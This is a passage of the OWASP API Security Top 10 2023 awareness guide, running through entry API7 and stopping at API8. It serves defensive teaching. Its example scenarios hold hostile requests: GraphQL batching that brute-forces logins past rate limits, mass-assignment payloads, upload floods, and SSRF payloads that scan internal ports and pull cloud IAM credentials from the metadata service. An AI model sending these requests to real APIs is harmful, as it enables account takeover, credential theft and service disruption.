# Foreword

A foundational element of innovation in today's app-driven world is the
Application Programming Interface (API). From banks, retail, and transportation
to IoT, autonomous vehicles, and smart cities, APIs are a critical part of
modern mobile, SaaS, and web applications and can be found in customer-facing,
partner-facing, and internal applications.

By nature, APIs expose application logic and sensitive data such as Personally
Identifiable Information (PII) and because of this, APIs have increasingly
become a target for attackers. Without secure APIs, rapid innovation would be
impossible.

Although a broader web application security risks Top 10 still makes sense, due
to their particular nature, an API-specific security risks list is required.
API security focuses on strategies and solutions to understand and mitigate the
unique vulnerabilities and security risks associated with APIs.

If you're familiar with the [OWASP Top 10 Project][1], then you'll notice the
similarities between both documents: they are intended for readability and
adoption. If you're new to the OWASP Top 10 series, you may be better off
reading the [API Security Risks][2] and [Methodology and Data][3] sections
before jumping into the Top 10 list.

# Introduction

## Welcome to the OWASP API Security Top 10 - 2023!

Welcome to the second edition of the OWASP API Security Top 10!

This awareness document was first published back in 2019. Since then, the API
Security industry has flourished and become more mature. We strongly believe
this work has positively contributed to it, due to it being quickly adopted as
an industry reference.

APIs play a very important role in modern application architecture. But since
innovation has a different pace than creating security awareness, we believe
it's important to focus on creating awareness for common API security
weaknesses.

The primary goal of the OWASP API Security Top 10 is to educate those involved
in API development and maintenance, for example, developers, designers,
architects, managers, or organizations. You can know more about the API Security
Project visiting [the project page][1].

If you're not familiar with the OWASP top 10 series, we recommend checking at
least the following top 10 projects:

* [OWASP Cloud-Native Application Security Top 10][2]
* [OWASP Desktop App Security Top 10][3]
* [OWASP Docker Top 10][4]
* [OWASP Low-Code/No-Code Top 10][5]
* [OWASP Machine Learning Security Top Ten][6]
* [OWASP Mobile Top 10][7]
* [OWASP TOP 10][8]
* [OWASP Top 10 CI/CD Security Risks][9]
* [OWASP Top 10 Client-Side Security Risks][10]
* [OWASP Top 10 Privacy Risks][11]
* [OWASP Serverless Top 10][12]

None of the projects replaces another: if you're working on a mobile application
powered by a back-end API, you're better off reading both the corresponding top
10's. The same is valid if you're working on a web or desktop application
powered by APIs.

In the [Methodology and Data][13] section, you can read more about how this
edition was created. For now, we encourage everyone to contribute with
questions, comments, and ideas at our [GitHub repository][14] or
[Mailing list][15].

# API Security Risks

The [OWASP Risk Rating Methodology][1] was used to do the risk analysis.

The table below summarizes the terminology associated with the risk score.

| Threat Agents | Exploitability | Weakness Prevalence | Weakness Detectability | Technical Impact | Business Impacts |
| :-: | :-: | :-: | :-: | :-: | :-: |
| API Specific | Easy: **3** | Widespread **3** | Easy **3** | Severe **3** | Business Specific |
| API Specific | Average: **2** | Common **2** | Average **2** | Moderate **2** | Business Specific |
| API Specific | Difficult: **1** | Difficult **1** | Difficult **1** | Minor **1** | Business Specific |

**Note**: This approach does not take the likelihood of the threat agent into
account. Nor does it account for any of the various technical details associated
with your particular application. Any of these factors could significantly
affect the overall likelihood of an attacker finding and exploiting a particular
vulnerability. This rating does not take into account the actual impact on your
business. Your organization will have to decide how much security risk from
applications and APIs the organization is willing to accept given your culture,
industry, and regulatory environment. The purpose of the OWASP API Security Top
10 is not to do this risk analysis for you. Since this edition is not
data-driven, prevalence results from a consensus among the team members.

# OWASP Top 10 API Security Risks – 2023

| Risk | Description |
| ---- | ----------- |
| [API1:2023 - Broken Object Level Authorization][api1] | APIs tend to expose endpoints that handle object identifiers, creating a wide attack surface of Object Level Access Control issues. Object level authorization checks should be considered in every function that accesses a data source using an ID from the user. |
| [API2:2023 - Broken Authentication][api2] | Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or to exploit implementation flaws to assume other user's identities temporarily or permanently. Compromising a system's ability to identify the client/user, compromises API security overall. |
| [API3:2023 - Broken Object Property Level Authorization][api3] | This category combines [API3:2019 Excessive Data Exposure][1] and [API6:2019 - Mass Assignment][2], focusing on the root cause: the lack of or improper authorization validation at the object property level. This leads to information exposure or manipulation by unauthorized parties. |
| [API4:2023 - Unrestricted Resource Consumption][api4] | Satisfying API requests requires resources such as network bandwidth, CPU, memory, and storage. Other resources such as emails/SMS/phone calls or biometrics validation are made available by service providers via API integrations, and paid for per request. Successful attacks can lead to Denial of Service or an increase of operational costs. |
| [API5:2023 - Broken Function Level Authorization][api5] | Complex access control policies with different hierarchies, groups, and roles, and an unclear separation between administrative and regular functions, tend to lead to authorization flaws. By exploiting these issues, attackers can gain access to other users’ resources and/or administrative functions. |
| [API6:2023 - Unrestricted Access to Sensitive Business Flows][api6] | APIs vulnerable to this risk expose a business flow - such as buying a ticket, or posting a comment - without compensating for how the functionality could harm the business if used excessively in an automated manner. This doesn't necessarily come from implementation bugs. |
| [API7:2023 - Server Side Request Forgery][api7] | Server-Side Request Forgery (SSRF) flaws can occur when an API is fetching a remote resource without validating the user-supplied URI. This enables an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or a VPN. |
| [API8:2023 - Security Misconfiguration][api8] | APIs and the systems supporting them typically contain complex configurations, meant to make the APIs more customizable. Software and DevOps engineers can miss these configurations, or don't follow security best practices when it comes to configuration, opening the door for different types of attacks.  |
| [API9:2023 - Improper Inventory Management][api9] | APIs tend to expose more endpoints than traditional web applications, making proper and updated documentation highly important. A proper inventory of hosts and deployed API versions also are important to mitigate issues such as deprecated API versions and exposed debug endpoints. |
| [API10:2023 - Unsafe Consumption of APIs][api10] | Developers tend to trust data received from third-party APIs more than user input, and so tend to adopt weaker security standards. In order to compromise APIs, attackers go after integrated third-party services instead of trying to compromise the target API directly. |

# API1:2023 Broken Object Level Authorization

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Easy** | Technical **Moderate** : Business Specific |
| Attackers can exploit API endpoints that are vulnerable to broken object-level authorization by manipulating the ID of an object that is sent within the request. Object IDs can be anything from sequential integers, UUIDs, or generic strings. Regardless of the data type, they are easy to identify in the request target (path or query string parameters), request headers, or even as part of the request payload. | This issue is extremely common in API-based applications because the server component usually does not fully track the client’s state, and instead, relies more on parameters like object IDs, that are sent from the client to decide which objects to access. The server response is usually enough to understand whether the request was successful. | Unauthorized access to other users’ objects can result in data disclosure to unauthorized parties, data loss, or data manipulation. Under certain circumstances, unauthorized access to objects can also lead to full account takeover. |

## Is the API Vulnerable?

Object level authorization is an access control mechanism that is usually
implemented at the code level to validate that a user can only access the
objects that they should have permissions to access.

Every API endpoint that receives an ID of an object, and performs any action
on the object, should implement object-level authorization checks. The checks
should validate that the logged-in user has permissions to perform the
requested action on the requested object.

Failures in this mechanism typically lead to unauthorized information
disclosure, modification, or destruction of all data.

Comparing the user ID of the current session (e.g. by extracting it from the
JWT token) with the vulnerable ID parameter isn't a sufficient solution to
solve Broken Object Level Authorization (BOLA). This approach could address
only a small subset of cases.

In the case of BOLA, it's by design that the user will have access to the
vulnerable API endpoint/function. The violation happens at the object level,
by manipulating the ID. If an attacker manages to access an API
endpoint/function they should not have access to - this is a case of [Broken
Function Level Authorization][5] (BFLA) rather than BOLA.

## Example Attack Scenarios

### Scenario #1

An e-commerce platform for online stores (shops) provides a listing page with
the revenue charts for their hosted shops. Inspecting the browser requests, an
attacker can identify the API endpoints used as a data source for those charts
and their pattern: `/shops/{shopName}/revenue_data.json`. Using another API
endpoint, the attacker can get the list of all hosted shop names. With a
simple script to manipulate the names in the list, replacing `{shopName}` in
the URL, the attacker gains access to the sales data of thousands of e-commerce
stores.

### Scenario #2

An automobile manufacturer has enabled remote control of its vehicles via a
mobile API for communication with the driver's mobile phone. The API enables
the driver to remotely start and stop the engine and lock and unlock the doors.
As part of this flow, the user sends the Vehicle Identification Number (VIN) to
the API.
The API fails to validate that the VIN represents a vehicle that belongs to the
logged in user, which leads to a BOLA vulnerability. An attacker can access
vehicles that don't belong to him.

### Scenario #3

An online document storage service allows users to view, edit, store and delete
their documents. When a user's document is deleted, a GraphQL mutation with the
document ID is sent to the API.

```
POST /graphql
{
  "operationName":"deleteReports",
  "variables":{
    "reportKeys":["<DOCUMENT_ID>"]
  },
  "query":"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {
    {
      deleteReports(reportKeys: $reportKeys)
    }
  }"
}
```

Since the document with the given ID is deleted without any further permission
checks, a user may be able to delete another user's document.

## How To Prevent

* Implement a proper authorization mechanism that relies on the user policies
  and hierarchy.
* Use the authorization mechanism to check if the logged-in user has access to
  perform the requested action on the record in every function that uses an
  input from the client to access a record in the database.
* Prefer the use of random and unpredictable values as GUIDs for records' IDs.
* Write tests to evaluate the vulnerability of the authorization mechanism. Do
  not deploy changes that make the tests fail.

# API2:2023 Broken Authentication

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Severe** : Business Specific |
| The authentication mechanism is an easy target for attackers since it's exposed to everyone. Although more advanced technical skills may be required to exploit some authentication issues, exploitation tools are generally available. | Software and security engineers’ misconceptions regarding authentication boundaries and inherent implementation complexity make authentication issues prevalent. Methodologies of detecting broken authentication are available and easy to create. | Attackers can gain complete control of other users’ accounts in the system, read their personal data, and perform sensitive actions on their behalf. Systems are unlikely to be able to distinguish attackers’ actions from legitimate user ones. |

## Is the API Vulnerable?

Authentication endpoints and flows are assets that need to be protected.
Additionally, "Forgot password / reset password" should be treated the same way
as authentication mechanisms.

An API is vulnerable if it:

* Permits credential stuffing where the attacker uses brute force with a list
  of valid usernames and passwords.
* Permits attackers to perform a brute force attack on the same user account,
  without presenting captcha/account lockout mechanism.
* Permits weak passwords.
* Sends sensitive authentication details, such as auth tokens and passwords in
  the URL.
* Allows users to change their email address, current password, or do any other
  sensitive operations without asking for password confirmation.
* Doesn't validate the authenticity of tokens.
* Accepts unsigned/weakly signed JWT tokens (`{"alg":"none"}`)
* Doesn't validate the JWT expiration date.
* Uses plain text, non-encrypted, or weakly hashed passwords.
* Uses weak encryption keys.

On top of that, a microservice is vulnerable if:

* Other microservices can access it without authentication
* Uses weak or predictable tokens to enforce authentication

## Example Attack Scenarios

## Scenario #1

In order to perform user authentication the client has to issue an API request
like the one below with the user credentials:

```
POST /graphql
{
  "query":"mutation {
    login (username:\"<username>\",password:\"<password>\") {
      token
    }
   }"
}
```

If credentials are valid, then an auth token is returned which should be
provided in subsequent requests to identify the user. Login attempts are
subject to restrictive rate limiting: only three requests are allowed per
minute.

To brute force log in with a victim's account, bad actors leverage GraphQL
query batching to bypass the request rate limiting, speeding up the attack:

```
POST /graphql
[
  {"query":"mutation{login(username:\"victim\",password:\"password\"){token}}"},
  {"query":"mutation{login(username:\"victim\",password:\"123456\"){token}}"},
  {"query":"mutation{login(username:\"victim\",password:\"qwerty\"){token}}"},
  ...
  {"query":"mutation{login(username:\"victim\",password:\"123\"){token}}"},
]
```

## Scenario #2

In order to update the email address associated with a user's account, clients
should issue an API request like the one below:

```
PUT /account
Authorization: Bearer <token>

{ "email": "<new_email_address>" }
```

Because the API does not require users to confirm their identity by providing
their current password, bad actors able to put themselves in a position to
steal the auth token might be able to take over the victim's account by starting
the reset password workflow after updating the email address of the victim's
account.

## How To Prevent

* Make sure you know all the possible flows to authenticate to the API
  (mobile/ web/deep links that implement one-click authentication/etc.). Ask
  your engineers what flows you missed.
* Read about your authentication mechanisms. Make sure you understand what and
  how they are used. OAuth is not authentication, and neither are API keys.
* Don't reinvent the wheel in authentication, token generation, or password
  storage. Use the standards.
* Credential recovery/forgot password endpoints should be treated as login
  endpoints in terms of brute force, rate limiting, and lockout protections.
* Require re-authentication for sensitive operations (e.g. changing the account
  owner email address/2FA phone number).
* Use the [OWASP Authentication Cheatsheet][1].
* Where possible, implement multi-factor authentication.
* Implement anti-brute force mechanisms to mitigate credential stuffing,
  dictionary attacks, and brute force attacks on your authentication endpoints.
  This mechanism should be stricter than the regular rate limiting mechanisms
  on your APIs.
* Implement [account lockout][2]/captcha mechanisms to prevent brute force
  attacks against specific users. Implement weak-password checks.
* API keys should not be used for user authentication. They should only be used
  for [API clients][3] authentication.

# API3:2023 Broken Object Property Level Authorization

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Moderate** : Business Specific |
| APIs tend to expose endpoints that return all object’s properties. This is particularly valid for REST APIs. For other protocols such as GraphQL, it may require crafted requests to specify which properties should be returned. Identifying these additional properties that can be manipulated requires more effort, but there are a few automated tools available to assist in this task. | Inspecting API responses is enough to identify sensitive information in returned objects’ representations. Fuzzing is usually used to identify additional (hidden) properties. Whether they can be changed is a matter of crafting an API request and analyzing the response. Side-effect analysis may be required if the target property is not returned in the API response. | Unauthorized access to private/sensitive object properties may result in data disclosure, data loss, or data corruption. Under certain circumstances, unauthorized access to object properties can lead to privilege escalation or partial/full account takeover. |

## Is the API Vulnerable?

When allowing a user to access an object using an API endpoint, it is important
to validate that the user has access to the specific object properties they are
trying to access.

An API endpoint is vulnerable if:

* The API endpoint exposes properties of an object that are considered
  sensitive and should not be read by the user. (previously named: "[Excessive
  Data Exposure][1]")
* The API endpoint allows a user to change, add/or delete the value of a
  sensitive object's property which the user should not be able to access
  (previously named: "[Mass Assignment][2]")

## Example Attack Scenarios

### Scenario #1

A dating app allows a user to report other users for inappropriate behavior.
As part of this flow, the user clicks on a "report" button, and the following
API call is triggered:

```
POST /graphql
{
  "operationName":"reportUser",
  "variables":{
    "userId": 313,
    "reason":["offensive behavior"]
  },
  "query":"mutation reportUser($userId: ID!, $reason: String!) {
    reportUser(userId: $userId, reason: $reason) {
      status
      message
      reportedUser {
        id
        fullName
        recentLocation
      }
    }
  }"
}
```

The API Endpoint is vulnerable since it allows the authenticated user to have
access to sensitive (reported) user object properties, such as "fullName" and
"recentLocation" that are not supposed to be accessed by other users.

### Scenario #2

An online marketplace platform, that offers one type of users ("hosts") to rent
out their apartment to another type of users ("guests"), requires the host to
accept a booking made by a guest, before charging the guest for the stay.

As part of this flow, an API call is sent by the host to
`POST /api/host/approve_booking` with the following legitimate payload:

```
{
  "approved": true,
  "comment": "Check-in is after 3pm"
}
```

The host replays the legitimate request, and adds the following malicious
payload:

```
{
  "approved": true,
  "comment": "Check-in is after 3pm",
  "total_stay_price": "$1,000,000"
}
```

The API endpoint is vulnerable because there is no validation that the host
should have access to the internal object property - `total_stay_price`, and
the guest will be charged more than she was supposed to be.

### Scenario #3

A social network that is based on short videos, enforces restrictive content
filtering and censorship. Even if an uploaded video is blocked, the user can
change the description of the video using the following API request:

```
PUT /api/video/update_video

{
  "description": "a funny video about cats"
}
```

A frustrated user can replay the legitimate request, and add the following
malicious payload:

```
{
  "description": "a funny video about cats",
  "blocked": false
}
```

The API endpoint is vulnerable because there is no validation if the user
should have access to the internal object property - `blocked`, and the user
can change the value from `true` to `false` and unlock their own blocked
content.

## How To Prevent

* When exposing an object using an API endpoint, always make sure that the user
  should have access to the object's properties you expose.
* Avoid using generic methods such as `to_json()` and `to_string()`. Instead,
  cherry-pick specific object properties you specifically want to return.
* If possible, avoid using functions that automatically bind a client's input
  into code variables, internal objects, or object properties
  ("Mass Assignment").
* Allow changes only to the object's properties that should be updated by the
  client.
* Implement a schema-based response validation mechanism as an extra layer of
  security. As part of this mechanism, define and enforce data returned by all
  API methods.
* Keep returned data structures to the bare minimum, according to the
  business/functional requirements for the endpoint.

# API4:2023 Unrestricted Resource Consumption

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Average** | Prevalence **Widespread** : Detectability **Easy** | Technical **Severe** : Business Specific |
| Exploitation requires simple API requests. Multiple concurrent requests can be performed from a single local computer or by using cloud computing resources. Most of the automated tools available are designed to cause DoS via high loads of traffic, impacting APIs’ service rate. | It's common to find APIs that do not limit client interactions or resource consumption. Crafted API requests, such as those including parameters that control the number of resources to be returned and performing response status/time/length analysis should allow identification of the issue. The same is valid for batched operations. Although threat agents don't have visibility over costs impact, this can be inferred based on service providers’ (e.g. cloud provider) business/pricing model. | Exploitation can lead to DoS due to resource starvation, but it can also lead to operational costs increase such as those related to the infrastructure due to higher CPU demand, increasing cloud storage needs, etc. |

## Is the API Vulnerable?

Satisfying API requests requires resources such as network bandwidth, CPU,
memory, and storage. Sometimes required resources are made available by service
providers via API integrations, and paid for per request, such as sending
emails/SMS/phone calls, biometrics validation, etc.

An API is vulnerable if at least one of the following limits is missing or set
inappropriately (e.g. too low/high):

* Execution timeouts
* Maximum allocable memory
* Maximum number of file descriptors
* Maximum number of processes
* Maximum upload file size
* Number of operations to perform in a single API client request (e.g. GraphQL
  batching)
* Number of records per page to return in a single request-response
* Third-party service providers' spending limit

## Example Attack Scenarios

### Scenario #1

A social network implemented a “forgot password” flow using SMS verification,
enabling the user to receive a one time token via SMS in order to reset their
password.

Once a user clicks on "forgot password" an API call is sent from the user's
browser to the back-end API:

```
POST /initiate_forgot_password

{
  "step": 1,
  "user_number": "6501113434"
}
```

Then, behind the scenes, an API call is sent from the back-end to a 3rd party
API that takes care of the SMS delivering:

```
POST /sms/send_reset_pass_code

Host: willyo.net

{
  "phone_number": "6501113434"
}
```

The 3rd party provider, Willyo, charges $0.05 per this type of call.

An attacker writes a script that sends the first API call tens of thousands of
times. The back-end follows and requests Willyo to send tens of thousands of
text messages, leading the company to lose thousands of dollars in a matter of
minutes.

### Scenario #2

A GraphQL API Endpoint allows the user to upload a profile picture.

```
POST /graphql

{
  "query": "mutation {
    uploadPic(name: \"pic1\", base64_pic: \"R0FOIEFOR0xJVA…\") {
      url
    }
  }"
}
```

Once the upload is complete, the API generates multiple thumbnails with
different sizes based on the uploaded picture. This graphical operation takes a
lot of memory from the server.

The API implements a traditional rate limiting protection - a user can't access
the GraphQL endpoint too many times in a short period of time. The API also
checks for the uploaded picture's size before generating thumbnails to avoid
processing pictures that are too large.

An attacker can easily bypass those mechanisms, by leveraging the flexible
nature of GraphQL:

```
POST /graphql

[
  {"query": "mutation {uploadPic(name: \"pic1\", base64_pic: \"R0FOIEFOR0xJVA…\") {url}}"},
  {"query": "mutation {uploadPic(name: \"pic2\", base64_pic: \"R0FOIEFOR0xJVA…\") {url}}"},
  ...
  {"query": "mutation {uploadPic(name: \"pic999\", base64_pic: \"R0FOIEFOR0xJVA…\") {url}}"},
}
```

Because the API does not limit the number of times the `uploadPic` operation can
be attempted, the call will lead to exhaustion of server memory and Denial of
Service.

### Scenario #3

A service provider allows clients to download arbitrarily large files using its
API. These files are stored in cloud object storage and they don't change that
often. The service provider relies on a cache service to have a better service
rate and to keep bandwidth consumption low. The cache service only caches files
up to 15GB.

When one of the files gets updated, its size increases to 18GB. All service
clients immediately start pulling the new version. Because there were no
consumption cost alerts, nor a maximum cost allowance for the cloud service,
the next monthly bill increases from US$13, on average, to US$8k.

## How To Prevent

* Use a solution that makes it easy to limit [memory][1],
  [CPU][2], [number of restarts][3], [file descriptors, and processes][4] such
  as Containers / Serverless code (e.g. Lambdas).
* Define and enforce a maximum size of data on all incoming parameters and
  payloads, such as maximum length for strings, maximum number of elements in
  arrays, and maximum upload file size (regardless of whether it is stored
  locally or in cloud storage).
* Implement a limit on how often a client can interact with the API within a
  defined timeframe (rate limiting).
* Rate limiting should be fine tuned based on the business needs. Some API
  Endpoints might require stricter policies.
* Limit/throttle how many times or how often a single API client/user can
  execute a single operation (e.g. validate an OTP, or request password
  recovery without visiting the one-time URL).
* Add proper server-side validation for query string and request body
  parameters, specifically the one that controls the number of records to be
  returned in the response.
* Configure spending limits for all service providers/API integrations. When
  setting spending limits is not possible, billing alerts should be configured
  instead.

# API5:2023 Broken Function Level Authorization

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Severe** : Business Specific |
| Exploitation requires the attacker to send legitimate API calls to an API endpoint that they should not have access to as anonymous users or regular, non-privileged users. Exposed endpoints will be easily exploited. | Authorization checks for a function or resource are usually managed via configuration or code level. Implementing proper checks can be a confusing task since modern applications can contain many types of roles, groups, and complex user hierarchies (e.g. sub-users, or users with more than one role). It's easier to discover these flaws in APIs since APIs are more structured, and accessing different functions is more predictable. | Such flaws allow attackers to access unauthorized functionality. Administrative functions are key targets for this type of attack and may lead to data disclosure, data loss, or data corruption. Ultimately, it may lead to service disruption. |

## Is the API Vulnerable?

The best way to find broken function level authorization issues is to perform
a deep analysis of the authorization mechanism while keeping in mind the user
hierarchy, different roles or groups in the application, and asking the
following questions:

* Can a regular user access administrative endpoints?
* Can a user perform sensitive actions (e.g. creation, modification, or
  deletion ) that they should not have access to by simply changing the HTTP
  method (e.g. from `GET` to `DELETE`)?
* Can a user from group X access a function that should be exposed only to
  users from group Y, by simply guessing the endpoint URL and parameters
  (e.g. `/api/v1/users/export_all`)?

Don't assume that an API endpoint is regular or administrative only based on
the URL path.

While developers might choose to expose most of the administrative endpoints
under a specific relative path, like `/api/admins`, it's very common to find
these administrative endpoints under other relative paths together with regular
endpoints, like `/api/users`.

## Example Attack Scenarios

### Scenario #1

During the registration process for an application that allows only invited
users to join, the mobile application triggers an API call to
`GET /api/invites/{invite_guid}`. The response contains a JSON with details
about the invite, including the user's role and the user's email.

An attacker duplicates the request and manipulates the HTTP method and endpoint
to `POST /api/invites/new`. This endpoint should only be accessed by
administrators using the admin console. The endpoint does not implement
function level authorization checks.

The attacker exploits the issue and sends a new invite with admin privileges:

```
POST /api/invites/new

{
  "email": "attacker@somehost.com",
  "role":"admin"
}
```

Later on, the attacker uses the maliciously crafted invite in order to create
themselves an admin account and gain full access to the system.

### Scenario #2

An API contains an endpoint that should be exposed only to administrators -
`GET /api/admin/v1/users/all`. This endpoint returns the details of all the
users of the application and does not implement function level authorization
checks. An attacker who learned the API structure takes an educated guess and
manages to access this endpoint, which exposes sensitive details of the users
of the application.

## How To Prevent

Your application should have a consistent and easy-to-analyze authorization
module that is invoked from all your business functions. Frequently, such
protection is provided by one or more components external to the application
code.

* The enforcement mechanism(s) should deny all access by default, requiring
  explicit grants to specific roles for access to every function.
* Review your API endpoints against function level authorization flaws, while
  keeping in mind the business logic of the application and groups hierarchy.
* Make sure that all of your administrative controllers inherit from an
  administrative abstract controller that implements authorization checks
  based on the user's group/role.
* Make sure that administrative functions inside a regular controller implement
  authorization checks based on the user's group and role.

# API6:2023 Unrestricted Access to Sensitive Business Flows

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Average** | Technical **Moderate** : Business Specific |
| Exploitation usually involves understanding the business model backed by the API, finding sensitive business flows, and automating access to these flows, causing harm to the business. | Lack of a holistic view of the API in order to fully support business requirements tends to contribute to the prevalence of this issue. Attackers manually identify what resources (e.g. endpoints) are involved in the target workflow and how they work together. If mitigation mechanisms are already in place, attackers need to find a way to bypass them. | In general technical impact is not expected. Exploitation might hurt the business in different ways, for example: prevent legitimate users from purchasing a product, or lead to inflation in the internal economy of a game. |

## Is the API Vulnerable?

When creating an API Endpoint, it is important to understand which business flow
it exposes. Some business flows are more sensitive than others, in the sense
that excessive access to them may harm the business.

Common examples of sensitive business flows and risk of excessive access
associated with them:

* Purchasing a product flow - an attacker can buy all the stock of a high-demand
  item at once and resell for a higher price (scalping)
* Creating a comment/post flow - an attacker can spam the system
* Making a reservation - an attacker can reserve all the available time slots
  and prevent other users from using the system

The risk of excessive access might change between industries and businesses.
For example - creation of posts by a script might be considered as a risk of
spam by one social network, but encouraged by another social network.

An API Endpoint is vulnerable if it exposes a sensitive business flow, without
appropriately restricting the access to it.

## Example Attack Scenarios

### Scenario #1

A technology company announces they are going to release a new gaming console on
Thanksgiving. The product has a very high demand and the stock is limited. An
attacker writes code to automatically buy the new product and complete the
transaction.

On the release day, the attacker runs the code distributed across different IP
addresses and locations. The API doesn't implement the appropriate protection
and allows the attacker to buy the majority of the stock before other legitimate
users.

Later on, the attacker sells the product on another platform for a much higher
price.

### Scenario #2

An airline company offers online ticket purchasing with no cancellation fee. A
user with malicious intentions books 90% of the seats of a desired flight.

A few days before the flight the malicious user canceled all the tickets at
once, which forced the airline to discount the ticket prices in order to fill
the flight.

At this point, the user buys herself a single ticket that is much cheaper than
the original one.

### Scenario #3

A ride-sharing app provides a referral program - users can invite their friends
and gain credit for each friend who has joined the app. This credit can be later
used as cash to book rides.

An attacker exploits this flow by writing a script to automate the registration
process, with each new user adding credit to the attacker's wallet.

The attacker can later enjoy free rides or sell the accounts with excessive
credits for cash.

## How To Prevent

The mitigation planning should be done in two layers:

* Business - identify the business flows that might harm the business if they
  are excessively used.
* Engineering - choose the right protection mechanisms to mitigate the business
  risk.

    Some of the protection mechanisms are more simple while others are more
    difficult to implement. The following methods are used to slow down
    automated
    threats:

    * Device fingerprinting: denying service to unexpected client devices (e.g
      headless browsers) tends to make threat actors use more sophisticated
      solutions, thus more costly for them
    * Human detection: using either captcha or more advanced biometric solutions
      (e.g. typing patterns)
    * Non-human patterns: analyze the user flow to detect non-human patterns
      (e.g. the user accessed the "add to cart" and "complete purchase"
      functions in less than one second)
    * Consider blocking IP addresses of Tor exit nodes and well-known proxies

    Secure and limit access to APIs that are consumed directly by machines (such
    as developer and B2B APIs). They tend to be an easy target for attackers
    because they often don't implement all the required protection mechanisms.

# API7:2023 Server Side Request Forgery

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Moderate** : Business Specific |
| Exploitation requires the attacker to find an API endpoint that accesses a URI that’s provided by the client. In general, basic SSRF (when the response is returned to the attacker), is easier to exploit than Blind SSRF in which the attacker has no feedback on whether or not the attack was successful. | Modern concepts in application development encourage developers to access URIs provided by the client. Lack of or improper validation of such URIs are common issues. Regular API requests and response analysis will be required to detect the issue. When the response is not returned (Blind SSRF) detecting the vulnerability requires more effort and creativity. | Successful exploitation might lead to internal services enumeration (e.g. port scanning), information disclosure, bypassing firewalls, or other security mechanisms. In some cases, it can lead to DoS or the server being used as a proxy to hide malicious activities. |

## Is the API Vulnerable?

Server-Side Request Forgery (SSRF) flaws occur when an API is fetching a remote
resource without validating the user-supplied URL. It enables an attacker to
coerce the application to send a crafted request to an unexpected destination,
even when protected by a firewall or a VPN.

Modern concepts in application development make SSRF more common and more
dangerous.

More common - the following concepts encourage developers to access an external
resource based on user input: Webhooks, file fetching from URLs, custom SSO,
and URL previews.

More dangerous - Modern technologies like cloud providers, Kubernetes, and
Docker expose management and control channels over HTTP on predictable,
well-known paths. Those channels are an easy target for an SSRF attack.

It is also more challenging to limit outbound traffic from your application,
because of the connected nature of modern applications.

The SSRF risk can not always be completely eliminated. While choosing a
protection mechanism, it is important to consider the business risks and needs.

## Example Attack Scenarios

### Scenario #1

A social network allows users to upload profile pictures. The user can choose
either to upload the image file from their machine, or provide the URL of the
image. Choosing the second, will trigger the following API call:

```
POST /api/profile/upload_picture

{
  "picture_url": "http://example.com/profile_pic.jpg"
}
```

An attacker can send a malicious URL and initiate port scanning within the
internal network using the API Endpoint.

```
{
  "picture_url": "localhost:8080"
}
```

Based on the response time, the attacker can figure out whether the port is
open or not.

### Scenario #2

A security product generates events when it detects anomalies in the network.
Some teams prefer to review the events in a broader, more generic monitoring
system, such as a SIEM (Security Information and Event Management). For this
purpose, the product provides integration with other systems using webhooks.

As part of a creation of a new webhook, a GraphQL mutation is sent with the URL
of the SIEM API.

```
POST /graphql

[
  {
    "variables": {},
    "query": "mutation {
      createNotificationChannel(input: {
        channelName: \"ch_piney\",
        notificationChannelConfig: {
          customWebhookChannelConfigs: [
            {
              url: \"http://www.siem-system.com/create_new_event\",
              send_test_req: true
            }
          ]
    	  }
  	  }){
    	channelId
  	}
	}"
  }
]

```

During the creation process, the API back-end sends a test request to the
provided webhook URL, and presents to the user the response.

An attacker can leverage this flow, and make the API request a sensitive
resource, such as an internal cloud metadata service that exposes credentials:

```
POST /graphql

[
  {
    "variables": {},
    "query": "mutation {
      createNotificationChannel(input: {
        channelName: \"ch_piney\",
        notificationChannelConfig: {
          customWebhookChannelConfigs: [
            {
              url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\",
              send_test_req: true
            }
          ]
        }
      }) {
        channelId
      }
    }
  }
]
```

Since the application shows the response from the test request, the attacker
can view the credentials of the cloud environment.

## How To Prevent

* Isolate the resource fetching mechanism in your network: usually these
  features are aimed to retrieve remote resources and not internal ones.
* Whenever possible, use allow lists of:
    * Remote origins users are expected to download resources from (e.g. Google
      Drive, Gravatar, etc.)
    * URL schemes and ports
    * Accepted media types for a given functionality
* Disable HTTP redirections.
* Use a well-tested and maintained URL parser to avoid issues caused by URL
  parsing inconsistencies.
* Validate and sanitize all client-supplied input data.
* Do not send raw responses to clients.

# API8:2023 Security Misconfiguration

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Easy** | Technical **Severe** : Business Specific |
| Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available. | Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options. | Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise. |

## Is the API Vulnerable?

The API might be vulnerable if:

* Appropriate security hardening is missing across any part of the API stack,
  or if there are improperly configured permissions on cloud services
* The latest security patches are missing, or the systems are out of date
* Unnecessary features are enabled (e.g. HTTP verbs, logging features)
* There are discrepancies in the way incoming requests are processed by servers
  in the HTTP server chain
* Transport Layer Security (TLS) is missing
* Security or cache control directives are not sent to clients
* A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
* Error messages include stack traces, or expose other sensitive information

## Example Attack Scenarios

### Scenario #1

